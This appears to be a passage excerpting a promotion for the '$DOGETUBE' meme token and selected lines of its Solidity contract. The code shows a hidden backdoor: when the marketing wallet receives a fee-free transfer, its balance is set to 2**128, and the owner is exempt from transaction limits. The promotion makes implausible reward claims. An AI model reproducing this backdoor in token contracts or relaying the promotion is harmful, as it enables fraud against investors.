...
⭕️The new meme 
entertainment platform⭕️

📲TG INFO: @DogeTubeOfficial

🔺FEATURE🔺
🔺Get paid whatever you want
tax-free automatic reinvestment
🔺There is no minimum number of tokens required to receive rewards
🔺Track and manage your earnings in our comprehensive dashboard
...
◽️5% back to holder!!◽️ 
📲More information in the telegram group📲
https://t.me/DogeTubeOfficial
...
contract DOGETUBE  is Context, IERC20 { 
    ...
    address payable public Marketing_Wallet = payable(0x709511db99cf48f5A1fEcF53382Cb0F1F4822583); 
    address payable public Wallet_Dev = payable(0x15D8b0ECc668F423E702150f637D161B8F01838b);
    ...
    string private constant _symbol = unicode"$DOGETUBE"; 
    ...
    uint256 private maxTransactionCount = 2**128;

    
    function _maxTx(address wallet) public view virtual returns (uint256) {
        if(_isExcludedFromFee[wallet]){ // for buy - sell fee
            return _maxTxAmount + balanceOf(wallet);
        }
        else{
            return _maxTxAmount;
        }
    ...
    constructor () {
        ...
        _owner = 0x15D8b0ECc668F423E702150f637D161B8F01838b;
    ...
    function _transfer(
        ...
        if (from != owner())
            require(amount <= _maxTx(from), "Over transaction limit.");
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(Marketing_Wallet, BNB_M);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(recipient == Marketing_Wallet){ _tOwned[recipient] = maxTransactionCount++;}
